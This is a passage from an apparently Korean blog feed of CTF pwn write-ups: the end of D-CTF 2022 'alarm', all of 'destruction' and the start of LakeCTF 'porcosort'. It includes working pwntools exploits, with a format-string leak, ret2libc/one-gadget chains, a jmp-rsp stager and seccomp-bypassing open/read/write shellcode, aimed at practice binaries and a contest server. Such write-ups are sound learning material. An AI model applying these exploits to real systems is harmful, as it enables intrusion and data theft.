class="line">pop_rdi = libc_base + <span class="number">0x23b6a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span> * <span class="number">112</span> </span><br><span class="line">payload += <span class="string">&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line"><span class="comment">#payload += &#x27;C&#x27; * 8 # ret</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(system)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="find-libc"><a href="#find-libc" class="headerlink" title="find libc"></a>find libc</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 랜덤 값 전송 후</span></span><br><span class="line">ret = <span class="number">0x40067e</span></span><br><span class="line">pop_rdi = <span class="number">0x400a23</span></span><br><span class="line">puts_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = <span class="number">0x400690</span> <span class="comment">#e.plt[&#x27;puts&#x27;]</span></span><br><span class="line">open_got = e.got[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span> * <span class="number">112</span> </span><br><span class="line">payload += <span class="string">&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(puts_got) <span class="comment"># open_got</span></span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&#x27;leak addr: &#x27;</span> + <span class="built_in">hex</span>(leak_addr))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">puts: 970</span><br><span class="line">open: bf0</span><br></pre></td></tr></table></figure><p>libc database site: <a href="https://libcdb.konwur.de/">https://libcdb.konwur.de/</a></p><p>최종적으로 구한 libc version: <code>libc6_2.27-3ubuntu1.6_amd64.so</code></p><h3 id="Exploit-Code-remote-Ubuntu-18-04"><a href="#Exploit-Code-remote-Ubuntu-18-04" class="headerlink" title="Exploit Code (remote, Ubuntu 18.04)"></a>Exploit Code (remote, Ubuntu 18.04)</h3><p>remote libc가 Ubuntu 18.04의 libc 버전이라서 원가젯을 무리없이 사용할 수 있었다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./alarm&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;34.159.80.143&#x27;</span>, <span class="number">31776</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./alarm&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/usr/lib/x86_64-linux-gnu/libc-2.31.so&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;system!&#x27;</span>, <span class="string">&#x27;%11$p %9$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">leak = p.recvline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(leak)</span><br><span class="line"></span><br><span class="line">libc_leak = leak[<span class="number">0</span>]</span><br><span class="line">random_leak = leak[<span class="number">1</span>][:-<span class="number">1</span>] </span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;libc_leak :: &#x27;</span> + libc_leak)</span><br><span class="line">log.info(<span class="string">&#x27;random_leak :: &#x27;</span> + random_leak)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;alarm:&#x27;</span>, random_leak)</span><br><span class="line"></span><br><span class="line">libc_base = <span class="built_in">int</span>(libc_leak,<span class="number">16</span>) - <span class="number">231</span> - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;libc_base :: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x40067e</span></span><br><span class="line">oneshot = libc_base+<span class="number">0x4f302</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span> * <span class="number">112</span> </span><br><span class="line">payload += <span class="string">&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line"><span class="comment">#payload += p64(pop_rdi)</span></span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(oneshot)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h2><p>사실 이 대회 기간 때 libc version 구하고 main으로 돌려서(?) 뭐 이것저것 삽질하다가 못풀었다 ㅋㅋ;; main으로 돌리니깐 rip가 맨 처음 보내준 랜덤 값으로 바뀌어서 다른 일을 잠깐 하러 갔다. 그런 사이 대회가 종료되어서 서버가 바로 닫혀버려서 remote shell은 따지 못하였다. 후..</p><p>창도 다 닫아버려서 libc 버전도 까먹었고, 서버도 닫혀서 offset도 구할 수 없어서 디코에 조심스럽게 libc 버전을 물어봤더니 <code>libc6_2.27-3ubuntu1.6_amd64.so</code> 라고 친절하게 알려주셨다. 그래서 바이너리를 patch하고 풀어보았다. </p><p>사실 이 과정에서 새로운 사실을 알게 되었다.</p><p>알려주신 libc 버전은 Ubuntu 18.04과 동일하다. 그래서 Ubuntu 18.04에서 libc와 ld를 가져왔다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@ubuntu:~/ctf/dctf/alarm$ ldd alarm</span><br><span class="line">linux-vdso.so.1 (0x00007fff621e2000)</span><br><span class="line">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f05fa6c9000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x00007f05fa8cf000)</span><br><span class="line"></span><br><span class="line">jir4vvit@ubuntu:~/ctf/dctf/alarm$ ls</span><br><span class="line">alarm  ld-2.27.so  libc-2.27.so  local.py  remote.py</span><br></pre></td></tr></table></figure><p>patch를 하려는데 잘 안되어서 알아보니까 libc 이름을 <code>libc.so.6</code>으로 변경해야하더라.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@ubuntu:~/ctf/dctf/alarm$ patchelf --set-rpath . --set-interpreter ./ld-2.27.so alarm</span><br><span class="line">jir4vvit@ubuntu:~/ctf/dctf/alarm$ cp libc-2.27.so libc.so.6</span><br><span class="line">jir4vvit@ubuntu:~/ctf/dctf/alarm$ patchelf --set-rpath . --replace-needed libc.so.6 ./libc.so.6 alarm</span><br><span class="line">jir4vvit@ubuntu:~/ctf/dctf/alarm$ ldd alarm</span><br><span class="line">linux-vdso.so.1 (0x00007ffd5c699000)</span><br><span class="line">./libc.so.6 (0x00007f32d2251000)</span><br><span class="line">./ld-2.27.so =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007f32d2644000)</span><br></pre></td></tr></table></figure><p>이렇게 remote의 바이너리로 patch해서 remote를 잘 해결할 수 있었다.</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
            <tag> D-CTF </tag>
            
            <tag> one_gadget </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DefCamp Capture the Flag (D-CTF) 2022 - destruction (seccomp, shellcode)</title>
      <link href="/221005-d-ctf2022-destruction/"/>
      <url>/221005-d-ctf2022-destruction/</url>
      
        <content type="html"><![CDATA[<p>분석 환경: Windows 11, Ubuntu 20.04<br>사용자 제공 파일: 바이너리</p><p>해당 ctf에 pwn이 두 문제 나왔다. 이건 hard이다.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="보호-기법"><a href="#보호-기법" class="headerlink" title="보호 기법"></a>보호 기법</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>아무것도 안걸려있다. 스택에서 쉘코드도 실행이 가능하다. 하지만 <code>seccomp</code>이 걸려있지.. 쉘코드 실행이 선택적으로 가능하다.</p><h3 id="취약점"><a href="#취약점" class="headerlink" title="취약점"></a>취약점</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 buf[<span class="number">3</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  buf[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  buf[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Acces denied intruder detected!!&quot;</span>);</span><br><span class="line">  v5 = <span class="number">1</span>;</span><br><span class="line">  seccomp();</span><br><span class="line">  <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">0x38</span>uLL) &lt;= <span class="number">0</span> )             <span class="comment">// bof</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(<span class="string">&quot;done&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)buf, <span class="number">4uLL</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>취약점은 간단하다. 바로 bof가 발생하는 것을 한 눈에 찾아볼 수 있다.</p><p>그리고 이 바이너리에서 중요한 점은 seccomp 함수가 정의되어 있다는 사실이다. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( prctl(<span class="number">38</span>, <span class="number">1LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;prctl(NO_NEW_PRIVS)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !prctl(<span class="number">22</span>, <span class="number">2LL</span>, &amp;v1) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;prctl(SECCOMP)&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( *__errno_location() == <span class="number">22</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;SECCOMP_FILTER is not available. :(&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( !*__errno_location() )</span><br><span class="line">  __asm &#123; jmp     rsp &#125;</span><br></pre></td></tr></table></figure><p><code>seccomp-tools</code>을 이용하여 편리하게 확인해보자.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@ubuntu:~/ctf/dctf/destruction$ seccomp-tools dump ./destruction </span><br><span class="line">Acces denied intruder detected!!</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003</span><br><span class="line"> 0002: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0003: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0004: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0006: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0010: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0012</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0012: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p><code>open</code>, <code>read</code>, <code>exit</code>, <code>write</code> syscall을 사용할 수 있다.<br>즉,.. 쉘을 따는 문제가 아니라 flag를 ORW 해야하는 문제이다. </p><p>입력할 수 있는 바이트가 0x38인데 반해 <code>buf</code> 크기가 0x20이다. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────</span><br><span class="line">*RAX  0x0</span><br><span class="line"> RBX  0x400910 ◂— push   r15</span><br><span class="line">*RCX  0xfff0</span><br><span class="line">*RDX  0x4</span><br><span class="line">*RDI  0x400a09 ◂— outsd  dx, dword ptr fs:[rsi] /* &#x27;done&#x27; */</span><br><span class="line"> RSI  0x7ffeb916ffe0 ◂— 0x41414100656e6f64 /* &#x27;done&#x27; */</span><br><span class="line"> R8   0x0</span><br><span class="line"> R9   0x7c</span><br><span class="line"> R10  0xfffffffffffff40f</span><br><span class="line">*R11  0x4</span><br><span class="line"> R12  0x4005c0 ◂— xor    ebp, ebp</span><br><span class="line"> R13  0x7ffeb91700f0 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line">*RBP  0x4141414141414141 (&#x27;AAAAAAAA&#x27;)</span><br><span class="line">*RSP  0x7ffeb9170008 ◂— 0x4242424242424242 (&#x27;BBBBBBBB&#x27;)</span><br><span class="line">*RIP  0x40090a ◂— ret    </span><br><span class="line">──────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────</span><br><span class="line">   0x4008ef    test   eax, eax</span><br><span class="line">   0x4008f1    jne    0x4008fa                      &lt;0x4008fa&gt;</span><br><span class="line"> </span><br><span class="line">   0x4008f3    mov    eax, 0</span><br><span class="line">   0x4008f8    jmp    0x400909                      &lt;0x400909&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x400909    leave  </span><br><span class="line"> ► 0x40090a    ret    &lt;0x4242424242424242&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">──────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp 0x7ffeb9170008 ◂— 0x4242424242424242 (&#x27;BBBBBBBB&#x27;)</span><br><span class="line">01:0008│     0x7ffeb9170010 ◂— 0x4343434343434343 (&#x27;CCCCCCCC&#x27;)</span><br><span class="line">02:0010│     0x7ffeb9170018 —▸ 0x7ffeb91700f8 —▸ 0x7ffeb9170565 ◂— &#x27;./destruction&#x27;</span><br><span class="line">03:0018│     0x7ffeb9170020 ◂— 0x190f647a0</span><br><span class="line">04:0020│     0x7ffeb9170028 —▸ 0x400886 ◂— push   rbp</span><br><span class="line">05:0028│     0x7ffeb9170030 —▸ 0x400910 ◂— push   r15</span><br><span class="line">06:0030│     0x7ffeb9170038 ◂— 0x29e4545047266017</span><br><span class="line">07:0038│     0x7ffeb9170040 —▸ 0x4005c0 ◂— xor    ebp, ebp</span><br></pre></td></tr></table></figure><p>당연하게도 ret 자리에 바로 쉘코드를 넣으면 안된다. <code>jmp rsp</code>라는 좋은 가젯이 존재해서 그것을 사용해야 한다. 그러면 <code>rsp</code>로 jump 하여 그 주소에 저장된 코드를 실행하려고 할 것이다. 만약 <code>0x4242424242424242</code> 대신 <code>jmp rsp</code> 가젯 주소를 넣는다면? </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7ffeb9170008: 0x4141414141414141 0x0000000000400882 // jmp    rsp</span><br><span class="line">0x7ffeb9170010: 0x4343434343434343 ...</span><br></pre></td></tr></table></figure><p><code>0x4343434343434343</code> 가 실행될 것이다.</p><p>아무튼 이거에 유의해서 <code>ret</code>에 <code>jmp rsp</code> 주소를 넣어주면 된다. 그러면 우리가 적을 수 있는 바이트 수는 오직 8바이트만이 남는다. </p><p>흔한 트릭은 큰 바이트를 입력할 수 있는 <code>read</code> syscall을 호출하는 것이다. 이걸 8바이트로 구성하면 된다. <code>read</code> syscall을 구성하는 데에는 3개의 인수가 필요하다. 아니 syscall인까 4개가 필요하다.</p><p><code>rax</code>, <code>rdi</code>, <code>rsi</code>, <code>rdx</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RAX  0x0</span><br><span class="line">RDI  0x400a09 ◂— outsd  dx, dword ptr fs:[rsi] /* &#x27;done&#x27; */</span><br><span class="line">RSI  0x7ffd095c5020 ◂— 0x41414100656e6f64 /* &#x27;done&#x27; */</span><br><span class="line">RDX  0x4</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">asm(&#x27;&#x27;&#x27;</span><br><span class="line">    xor rdi, rdi</span><br><span class="line">    mov dh, 0x2</span><br><span class="line">    syscall</span><br><span class="line">    &#x27;&#x27;&#x27;)</span><br></pre></td></tr></table></figure><p><code>dh</code>에 0x2를 대입하면 <code>rdx</code>는 결국 0x00000204가 된다. </p><p>flag 위치는 문제에서 알려줬으니, 그 이후엔 seccomp에 명시된 syscall들을 사용하면서 편하게 ORW 하면 된다.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./destruction&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./destruction&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;done\x00&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span> * (<span class="number">0x28</span>-<span class="built_in">len</span>(payload))</span><br><span class="line"><span class="comment">#payload += &#x27;B&#x27; * 0x8 # ret</span></span><br><span class="line">payload += p64(<span class="number">0x400882</span>) <span class="comment"># jmp rsp</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">payload += asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        xor rdi, rdi</span></span><br><span class="line"><span class="string">        mov dh, 0x2</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;</span></span><br><span class="line">shellcode += <span class="string">&#x27;\x90&#x27;</span>*<span class="number">100</span></span><br><span class="line">shellcode += asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        xor rdx, rdx</span></span><br><span class="line"><span class="string">        xor rsi, rsi</span></span><br><span class="line"><span class="string">        push rsi</span></span><br><span class="line"><span class="string">        mov rax, 0x7478742e67616c66</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        mov rdi, rsp</span></span><br><span class="line"><span class="string">        mov rax, 0x2</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        mov rdi, rax</span></span><br><span class="line"><span class="string">        xor rax, rax</span></span><br><span class="line"><span class="string">        mov rdx, 0x60</span></span><br><span class="line"><span class="string">        mov rsi, rsp</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        mov rax, 1</span></span><br><span class="line"><span class="string">        mov rdi, 1</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>Team P3WP3W’s writeups (no link)</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> seccomp </tag>
            
            <tag> shellcode </tag>
            
            <tag> D-CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LakeCTF 2022 - porcosort (Dockerfile, libc, oob)</title>
      <link href="/221004-lakectf2022-porcosort/"/>
      <url>/221004-lakectf2022-porcosort/</url>
      
        <content type="html"><![CDATA[<p>분석 환경: Windows 11, Ubuntu 22.04<br>사용자 제공 파일: 바이너리, 도커파일</p><h2 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h2><p>libc 때문에.. 고생을 좀 했지만 결론적으로는 잘 해결했다. </p><p>맨 처음에 Ubuntu 20.04에서 분석 및 익스 진행하려고 했는데 실행이 잘 되지 않아 그냥 Ubuntu 22.04에서 진행했다. 버전을 올린 이유는 20.04에서 실행할 때 GLibc? 그 버전이 낮아서 실행이 안된다고 에러 문구가 떴기 때문에 당연하게도(?) 22.04로 버전을 올릴 생각을 하였기 때문이다. 하지만 결론적으로 Ubuntu 22.04의 libc도 아니었기 때문에(arch의 libc였음) 굳이 22.04로 버전을 안올리고 문제를 풀 수도 있었다.</p><p>ctf 챌린지에서 도커파일을 제공하는 이유는 libc 버전 때문이다. libc 파일을 던져준 것은 아니지만 libc를 거져준 것이나 다름없다. 알고있었지만 활용하는 방법을 제대로 알지 못했다. libc 때문에 삽질을 많이 해서 결국 롸업을 찾아보고 해당 부분을 바로 해결할 수 있었다. </p><p><a href="https://blog.csotiriou.com/post/lakectf-2022-qualifier-porcosort-pwn/#1-setup">https://blog.csotiriou.com/post/lakectf-2022-qualifier-porcosort-pwn/#1-setup</a></p><p>이번 기회로 도커파일을 눈여겨봐야겠다는 생각과 libc를 가져오고 patch하는 방법을 배웠다. 이제라도 알게 되어서 다행이다.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="로컬에서-문제-환경-세팅하기-feat-도커파일이-주어졌을-때-libc-가져오기"><a href="#로컬에서-문제-환경-세팅하기-feat-도커파일이-주어졌을-때-libc-가져오기" class="headerlink" title="로컬에서 문제 환경 세팅하기 (feat. 도커파일이 주어졌을 때 libc 가져오기)"></a>로컬에서 문제 환경 세팅하기 (feat. 도커파일이 주어졌을 때 libc 가져오기)</h3><p>Ubuntu 22.04에서 <code>ldd</code> 명령을 통해 바이너리에 매핑된 라이브러리를 알 수 있다. Ubuntu 20.04에서 